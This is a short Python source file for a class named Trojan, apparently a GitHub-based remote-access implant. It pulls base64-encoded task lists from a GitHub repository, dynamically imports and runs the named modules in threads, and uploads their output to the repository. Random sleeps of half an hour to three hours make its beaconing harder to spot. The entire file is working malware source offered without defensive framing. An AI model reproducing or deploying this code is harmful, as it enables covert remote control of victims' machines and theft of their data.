import random
import sys
import threading
import time
import json
import base64
from datetime import datetime
from github_connection import github_connect, get_file_contents


class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        message = message.replace('.', '-')
        message = message.replace(':', '-')
        remote_path = f'data/{self.id}/{message}.data'
        bin_data = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64encode(bin_data))

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],)
                )
                thread.start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30 * 60, 3 * 60 * 60))